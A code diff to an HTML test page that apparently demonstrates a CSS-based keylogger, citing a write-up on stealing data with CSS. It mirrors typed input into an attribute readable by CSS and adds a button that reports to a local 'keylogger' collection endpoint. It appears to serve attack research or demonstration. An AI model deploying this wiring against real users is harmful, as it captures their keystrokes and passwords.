@@ -18,7 +18,10 @@
             margin: 0 auto;
             margin-top: 100px;
         }
-
+        .submit {
+            display: inline-block;
+            background-color: red;
+        }
         #input-1 {
             width: 500px;
             height: 36px;
@@ -29,7 +32,7 @@
             padding: 4px 8px;
             font-family: "Courier New", sans-serif;
             margin-bottom: 40px;
-            display: block;
+            display: inline-block;
         }
 
         .input-container div {
@@ -48,14 +51,22 @@
 </head>
 <body>
 <div class="input-container" id="input-container">
-    <input type="text" id="input-1" value="abcab">
+        <input type="text" id="input-1" value="abcab">
+        <input type="button" id="submit" >
+    <div style='display: block;'>Searching Dict</div>
 </div>
 <div class="_blank"></div>
 <script>
     const inputDom = document.getElementById("input-1");
+    const submitbutton = document.getElementById("submit");
     inputDom.addEventListener("input", (e) => {
         inputDom.defaultValue = e.target.value;
     });
+    submitbutton.addEventListener("click", (e) => {
+        //e.defaultPrevented();
+        let url = "http://localhost:3000/report?site=keylogger&action=complete&payload=";
+        fetch(url).then(d => {console.log("send")});
+    })
 </script>
 <script>
     // https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense
